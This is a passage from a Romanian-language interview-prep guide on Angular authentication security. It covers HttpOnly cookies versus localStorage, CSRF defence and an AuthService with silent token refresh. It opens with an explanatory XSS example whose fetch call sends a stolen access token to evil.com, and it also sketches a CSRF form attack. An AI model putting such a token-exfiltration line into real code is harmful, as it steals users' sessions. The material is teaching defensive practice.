// Daca atacatorul reuseste XSS (ex: script injection intr-un camp):
const stolenToken = localStorage.getItem('access_token');
fetch('https://evil.com/steal?token=' + stolenToken);
// Atacatorul are acum token-ul tau!

// ✅ SIGUR: HttpOnly cookie
// Set-Cookie: refresh_token=abc123;
//   HttpOnly;        <- NU poate fi citit din JavaScript
//   Secure;          <- Trimis DOAR pe HTTPS
//   SameSite=Strict; <- NU trimis in cereri cross-origin
//   Path=/api/auth;  <- Trimis DOAR la endpoint-ul de refresh
//   Max-Age=604800;  <- Expira in 7 zile

// Chiar daca atacatorul reuseste XSS:
document.cookie; // NU va contine refresh_token (este HttpOnly)
```

| Caracteristica | HttpOnly Cookie | localStorage | In-Memory |
|---|---|---|---|
| Accesibil din JS | **NU** (protejat) | DA (vulnerabil) | DA (dar izolat) |
| Vulnerabil la XSS | **NU** | **DA** | Partial |
| Trimis automat cu requests | DA | NU | NU |
| Vulnerabil la CSRF | DA (rezolvabil) | NU | NU |
| Persistenta | Persista | Persista | Se pierde la refresh |

---

### Cum functioneaza cookies in detaliu

```
Set-Cookie: refresh_token=abc123;
  HttpOnly;          # Nu poate fi citit/modificat din JavaScript
  Secure;            # Trimis DOAR pe HTTPS (nu pe HTTP)
  SameSite=Strict;   # Nu trimis in cereri cross-site
                     #   Strict = niciodata cross-site
                     #   Lax = doar navigare top-level GET
                     #   None = mereu (necesita Secure)
  Path=/api/auth;    # Trimis DOAR la /api/auth/* endpoints
  Max-Age=604800;    # Expira in 7 zile (in secunde)
  Domain=.example.com; # Valabil pe toate subdomain-urile
```

**SameSite explicat:**
- `Strict` - cookie-ul NU e trimis in nicio cerere cross-site (nici cand user-ul da click pe un link catre site-ul tau)
- `Lax` (default) - cookie-ul e trimis doar pentru navigare top-level GET (click pe link da, form POST nu)
- `None` - cookie-ul e trimis mereu (necesita `Secure`) - folosit pentru third-party cookies

---

### CSRF protection

> **Cum spui la interviu:** "HttpOnly cookies rezolva XSS, dar introduc vulnerabilitate CSRF. Solutia e Double Submit Cookie pattern - Angular il implementeaza nativ."

**Cum functioneaza CSRF:**
```
1. User-ul se autentifica pe app.example.com -> browser stocheaza cookie
2. User-ul viziteaza evil.com
3. evil.com contine: <form action="https://app.example.com/api/transfer" method="POST">
4. Formularul se trimite automat CU cookie-urile existente
5. Server-ul nu poate distinge cererea legitima de cea malitioasa
```

**Protectie - Double Submit Cookie (Angular nativ):**

```typescript
// app.config.ts
export const appConfig: ApplicationConfig = {
  providers: [
    provideHttpClient(
      withXsrfConfiguration({
        cookieName: 'XSRF-TOKEN',     // Cookie-ul pe care server-ul il seteaza
        headerName: 'X-XSRF-TOKEN'    // Header-ul pe care Angular il trimite automat
      })
    )
  ]
};

// Cum functioneaza:
// 1. Server-ul seteaza un cookie NON-HttpOnly: XSRF-TOKEN=random_value
//    (Non-HttpOnly ca Angular sa-l poata citi)
// 2. Angular citeste cookie-ul si il trimite ca HEADER: X-XSRF-TOKEN
// 3. Server-ul verifica ca header-ul == cookie-ul
// 4. Atacatorul NU poate citi cookie-ul de pe alt domain (Same-Origin Policy)
//    deci nu poate seta header-ul corect
```

**SameSite=Strict pe refresh token** adauga un layer extra de protectie - cookie-ul nu e trimis deloc in cereri cross-site.

---

### Auth Service complet cu silent refresh

```typescript
@Injectable({ providedIn: 'root' })
export class AuthService {
  private http = inject(HttpClient);
  private router = inject(Router);

  // Access token stocat IN MEMORIE (nu in localStorage!)
  private accessToken: string | null = null;

  // Starea de autentificare ca signals
  private currentUserSignal = signal<User | null>(null);
  readonly currentUser = this.currentUserSignal.asReadonly();
  readonly isAuthenticated = computed(() => this.currentUserSignal() !== null);
  readonly userRoles = computed(() => this.currentUserSignal()?.roles ?? []);

  // Flag pentru refresh in progress (previne cereri multiple simultane)
  private isRefreshing = false;
  private refreshTokenSubject = new BehaviorSubject<string | null>(null);

  constructor() {
    this.tryAutoLogin();
  }

  // ---- Login ----
  login(credentials: LoginCredentials): Observable<void> {
    return this.http.post<{ accessToken: string }>(
      '/api/auth/login',
      credentials,
      { withCredentials: true }  // Server-ul seteaza refresh token ca HttpOnly cookie
    ).pipe(
      tap(response => this.handleAuthSuccess(response.accessToken)),
      map(() => void 0)
    );
  }

  // ---- Logout ----
  logout(): void {
    this.http.post('/api/auth/logout', {}, { withCredentials: true })
      .subscribe({ complete: () => this.handleLogout() });
  }

  // ---- Refresh ----
  refreshAccessToken(): Observable<string> {
    return this.http.post<{ accessToken: string }>(
      '/api/auth/refresh',
      {},                          // Body gol
      { withCredentials: true }    // Refresh token-ul e trimis automat ca cookie
    ).pipe(
      tap(response => this.handleAuthSuccess(response.accessToken)),
      map(response => response.accessToken),
      catchError(error => {
        this.handleLogout();
        return throwError(() => error);
      })
    );
  }

  getAccessToken(): string | null {
    return this.accessToken;
  }

  hasRole(role: string): boolean {
    return this.userRoles().includes(role);
  }

  // ---- Private helpers ----
  private handleAuthSuccess(accessToken: string): void {
    this.accessToken = accessToken;

    const payload = this.decodeToken(accessToken);
    if (payload) {
      this.currentUserSignal.set({
        id: payload.sub,
        email: payload.email,
        roles: payload.roles
      });
      this.scheduleTokenRefresh(payload);
    }
  }

  private handleLogout(): void {
    this.accessToken = null;
    this.currentUserSignal.set(null);
    this.router.navigate(['/login']);
  }

  private decodeToken(token: string): TokenPayload | null {
    try {
      const payload = token.split('.')[1];
      const decoded = atob(payload.replace(/-/g, '+').replace(/_/g, '/'));
      return JSON.parse(decoded);
    } catch {
      return null;
    }
  }

  private scheduleTokenRefresh(payload: TokenPayload): void {
    const expiresIn = payload.exp * 1000 - Date.now();
    const refreshIn = Math.max(expiresIn - 60_000, 0); // 60s inainte de expirare

    setTimeout(() => {
      this.refreshAccessToken().subscribe();
    }, refreshIn);
  }

  private tryAutoLogin(): void {
    // La pornirea aplicatiei, incercam sa obtinem un nou access token
    // folosind refresh token-ul din HttpOnly cookie (daca exista)
    this.refreshAccessToken().subscribe({
      error: () => console.log('No valid session found')
    });
  }
}
```

### Interceptor Angular cu token refresh

```typescript
// auth.interceptor.ts
export const authInterceptor: HttpInterceptorFn = (req, next) => {
  const authService = inject(AuthService);

  // Nu adaugam token pentru cereri de auth
  if (req.url.includes('/auth/')) {
    return next(req);
  }

  const token = authService.getAccessToken();

  // Adaugam token-ul la request
  const authReq = token
    ? req.clone({ setHeaders: { Authorization: `Bearer ${token}` } })
    : req;

  return next(authReq).pipe(
    catchError((error: HttpErrorResponse) => {
      if (error.status === 401) {
        return handle401Error(authService, req, next);
      }
      return throwError(() => error);
    })
  );
};

// Handler pentru 401 - refresh token si retry
function handle401Error(
  authService: AuthService,
  req: HttpRequest<unknown>,
  next: HttpHandlerFn
): Observable<HttpEvent<unknown>> {

  // Daca deja facem refresh, asteptam rezultatul
  // (previne multiple refresh requests simultane)
  return authService.refreshAccessToken().pipe(
    switchMap(newToken => {
      // Retry request-ul original cu noul token
      const retryReq = req.clone({
        setHeaders: { Authorization: `Bearer ${newToken}` }
      });
      return next(retryReq);
    }),
    catchError(err => {
      // Refresh a esuat - redirect la login
      authService.logout();
      return throwError(() => err);
    })
  );
}

// Inregistrare in app.config.ts
export const appConfig: ApplicationConfig = {
  providers: [
    provideHttpClient(
      withInterceptors([authInterceptor]),
      withXsrfConfiguration({
        cookieName: 'XSRF-TOKEN',
        headerName: 'X-XSRF-TOKEN'
      })
    ),
    // Silent refresh la pornirea aplicatiei
    {
      provide: APP_INITIALIZER,
      useFactory: () => {
        const authService = inject(AuthService);
        return () => firstValueFrom(
          authService.refreshAccessToken().pipe(
            map(() => true),
            catchError(() => of(false))
          )
        );
      },
      multi: true
    }
  ]
};
```

---

### Rezumat securitate - ce sa mentionezi la interviu

> **Framework de raspuns pentru securitate:**

```
1. "Access token in memorie, refresh token in HttpOnly cookie"
   → Demonstreaza ca stii strategia hibrida

2. "localStorage e vulnerabil la XSS"
   → Demonstreaza awareness de securitate

3. "HttpOnly cookies introduc CSRF, dar Angular are protectie nativa"
   → Demonstreaza ca intelegi trade-off-urile

4. "PKCE e obligatoriu pentru SPA-uri"
   → Demonstreaza cunostinte OAuth2 moderne

5. "Silent refresh cu APP_INITIALIZER la pornirea aplicatiei"
   → Demonstreaza gandire UX + securitate

6. "SameSite=Strict + Secure + HttpOnly + Path specific"
   → Demonstreaza defense in depth
```
